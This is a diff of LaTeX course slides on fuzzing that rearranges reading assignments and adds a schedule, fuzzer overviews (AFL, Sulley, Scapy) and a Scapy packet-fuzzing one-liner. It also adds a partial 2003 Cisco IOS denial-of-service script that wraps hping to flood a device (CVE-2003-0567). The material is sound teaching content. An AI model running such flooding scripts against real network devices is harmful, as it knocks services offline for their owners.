@@ -26,15 +26,7 @@
 \end{list2}
 \end{list1}
 
-\slide{Reading Summary}
 
-\begin{list1}
-\item AoST chapter 10: Implementing a custom Fuzz Utility
-\item AoST chapter 11: Local Fault Injection
-\item AoST chapter 12: Determining Exploitability
-\end{list1}
-
-Note: the tool Ethereal was later renamed to Wireshark.
 
 \slide{Goals: Fuzzing}
 
@@ -46,6 +38,38 @@ Note: the tool Ethereal was later renamed to Wireshark.
 \item Lots of crashes is often the result, and when investigated may be exploitable
 \item Recommended to use fuzzers that can use some structure and knowledge and then randomize individual fields in protocols, file types etc.
 \end{list1}
+
+\slide{Time schedule}
+
+\hlkimage{4cm}{kame-noanime-small.png}
+
+Plan for the day
+\begin{list1}
+\item 12:45 - 13:45 -- Session 0: Catch up - reading assignments
+\item 13:45 - 14:00 -- 15min break
+\item 14:00 - 14:45 -- Session 1: Teaching: Fuzzing introduction
+\item 14:45 - 15:00 -- 15min break
+\item 15:00 - 16:45 -- Sessions 2+3: Fuzzing exercises
+\end{list1}
+
+
+\slide{Session 0: Catch up - reading introduction}
+
+I would like for you to read some more documents ...
+
+We will go through some documents from the resources in the folder Supporting resources online, hopefully inspire you to read more of them.
+
+Before next time, please look at:
+\begin{list1}
+\item  \emph{Windows 11 Security Book: Powerful security by design}, Microsoft \\
+Available in the folder as: \verb+MSFT-Windows11-Security-book_Sept2023.pdf+
+\item \emph{Apple Platform Security}, august 2026, 266 pages, Apple\\
+\url{https://help.apple.com/pdf/security/en_US/apple-platform-security-guide.pdf}
+\end{list1}
+
+Maybe not read every word, but look through the Windows doc and browser the Apple one!
+
+\slide{Session 1: What is Fuzzing}
 
 \slide{What is Fuzzing}
 
@@ -252,43 +276,6 @@ We will go through this article
 
 
 
-
-\slide{Example fuzzers}
-
-\begin{quote}
-american fuzzy lop is a free software fuzzer that employs genetic algorithms in order to efficiently increase code coverage of the test cases. So far it helped in detection of significant software bugs in dozens of major free software projects, including X.Org Server,[2] PHP,[3] OpenSSL,[4][5] pngcrush, bash,[6] Firefox,[7] BIND,[8][9] Qt,[10] and SQLite.[11]
-
-american fuzzy lop's source code is published on GitHub. Its name is a reference to a breed of rabbit, the American Fuzzy Lop.
-\end{quote}
-
-\begin{list2}
-\item Several books and web sites are dedicated to fuzzing, one such:\\ \url{http://www.fuzzing.org/}
-\item \url{https://en.wikipedia.org/wiki/American_fuzzy_lop_(fuzzer)}
-\item Another one is Sulley, A pure-python fully automated and unattended fuzzing framework.\\
-\url{https://github.com/OpenRCE/sulley}
-\item Scapy Packet crafting for Python2 and Python3
-\url{https://scapy.net/}
-\end{list2}
-
-
-\slide{Scapy Fuzzing}
-
-\begin{quote}{\bf
-Fuzzing}
-
-The function fuzz() is able to change any default value that is not to be calculated (like checksums) by an object whose value is random and whose type is adapted to the field. This enables quickly building fuzzing templates and sending them in a loop. In the following example, the IP layer is normal, and the UDP and NTP layers are fuzzed. The UDP checksum will be correct, the UDP destination port will be overloaded by NTP to be 123 and the NTP version will be forced to be 4. All the other ports will be randomized. Note: If you use fuzz() in IP layer, src and dst parameter won’t be random so in order to do that use RandIP().:
-\end{quote}
-
-\begin{minted}[fontsize=\small]{python}
->>> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
-................^C
-Sent 16 packets.
-\end{minted}
-
-\exercise{ex:scapy}
-
-\exercise{ex:american-fuzzy-lop}
-
 \slide{Determining Exploitability}
 
 \begin{list2}
@@ -389,22 +376,68 @@ på Unix, over netværket.
 \item Some vulnerabilities are exploited \emph{in the wild}
 \end{list2}
 
-\slide{Book Summary}
 
-Last chapter:
+\slide{Example fuzzers afl}
+
+\begin{quote}
+american fuzzy lop is a free software fuzzer that employs genetic algorithms in order to efficiently increase code coverage of the test cases. So far it helped in detection of significant software bugs in dozens of major free software projects, including X.Org Server,[2] PHP,[3] OpenSSL,[4][5] pngcrush, bash,[6] Firefox,[7] BIND,[8][9] Qt,[10] and SQLite.[11]
+
+american fuzzy lop's source code is published on GitHub. Its name is a reference to a breed of rabbit, the American Fuzzy Lop.
+\end{quote}
+
 \begin{list2}
-\item Last chapter describes how to analyse crash dumps, for exploitability
-\item Can attacker use the vulnerability found for anything? control instruction pointer?
-\item Book finishes with Mitigating factors: use everything!
-\item CPU with hardware support, operating system with everything turned on Address space layout randomization (ASLR), stack protection, heap protection, etc.\\
-\url{https://en.wikipedia.org/wiki/Address_space_layout_randomization}
-\item Most laptop and server operating systems do this already in never versions\smiley
-\item Internet of Things do almost none of these
+\item Several books and web sites are dedicated to fuzzing, one such:\\ \url{http://www.fuzzing.org/}
+\item \url{https://en.wikipedia.org/wiki/American_fuzzy_lop_(fuzzer)}
+\item Another one is Sulley, A pure-python fully automated and unattended fuzzing framework.\\
+\url{https://github.com/OpenRCE/sulley}
+\item Scapy Packet crafting for Python
+\url{https://scapy.net/}
 \end{list2}
 
-Book overall?
 
-Good or bad?
+\slide{Example fuzzers Scapy}
+
+\begin{quote}{\bf
+Fuzzing}
+
+The function fuzz() is able to change any default value that is not to be calculated (like checksums) by an object whose value is random and whose type is adapted to the field. This enables quickly building fuzzing templates and sending them in a loop. In the following example, the IP layer is normal, and the UDP and NTP layers are fuzzed. The UDP checksum will be correct, the UDP destination port will be overloaded by NTP to be 123 and the NTP version will be forced to be 4. All the other ports will be randomized. Note: If you use fuzz() in IP layer, src and dst parameter won’t be random so in order to do that use RandIP().:
+\end{quote}
+
+\begin{minted}[fontsize=\small]{python}
+>>> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
+................^C
+Sent 16 packets.
+\end{minted}
+
+\slide{Cisco DoS \emph{exploit} script}
+
+\begin{alltt}\scriptsize
+\small
+#!/bin/sh
+# 2003-07-21 pdonahue
+# cisco-44020.sh -- this shell script is just a wrapper for hping (http://www.hping.org)
+#    with the parameters necessary to fill the input queue on exploitable IOS device
+# -- refer to "Cisco Security Advisory: Cisco IOS Interface Blocked by IPv4 Packets"
+# (http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml)
+...
+for protocol in $PROT
+    do
+       $HPING $HOST --rawip $ADDR --ttl $TTL --ipproto $protocol \\
+       --count $NUMB --interval u250 --data $SIZE --file /dev/urandom
+    done
+\end{alltt}
+
+CVE-2003-0567 -- Cisco IOS input queue wedge via crafted IPv4 protocol 53/55/77/103 packets\\
+\link{https://nvd.nist.gov/vuln/detail/CVE-2003-0567}
+
+
+\slide{Sessions 2+3: Fuzzing exercises}
+
+\exercise{ex:scapy}
+
+\exercise{ex:hping3-fuzzer}
+
+\exercise{ex:american-fuzzy-lop}
 
 
 \slidenext{}
